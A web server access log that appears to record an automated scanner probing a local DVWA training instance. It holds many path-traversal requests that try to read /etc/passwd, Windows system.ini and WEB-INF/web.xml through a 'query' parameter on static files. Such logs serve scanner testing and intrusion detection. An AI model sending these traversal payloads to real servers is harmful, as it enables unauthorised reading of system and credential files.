172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /docs/DVWA_v1.3.pdf?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=%2Fetc%2Fpasswd HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=c%3A%2F HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=%2F HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=c%3A%5C HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/logo.png?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=%2Fetc%2Fpasswd HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=%2Fetc%2Fpasswd HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=c%3A%2F HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=c%3A%2F HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=%2F HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=%2F HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=c%3A%5C HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=c%3A%5C HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/spanner.png?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/images/RandomStorm.png?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 301 594 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 301 740 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1366 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 301 594 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=%2Fetc%2Fpasswd HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 301 740 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=c%3A%2F HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=%2Fetc%2Fpasswd HTTP/1.1" 301 570 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=%2F HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=c%3A%5C HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 301 724 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=c%3A%2F HTTP/1.1" 301 554 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=c%3A%2F HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=%2F HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=%2F HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/add_event_listeners.js?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=c%3A%5C HTTP/1.1" 301 554 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=c%3A%5C HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 700 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=WEB-INF%2Fweb.xml HTTP/1.1" 301 574 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=WEB-INF%5Cweb.xml HTTP/1.1" 301 574 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 301 580 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 301 580 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 301 616 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
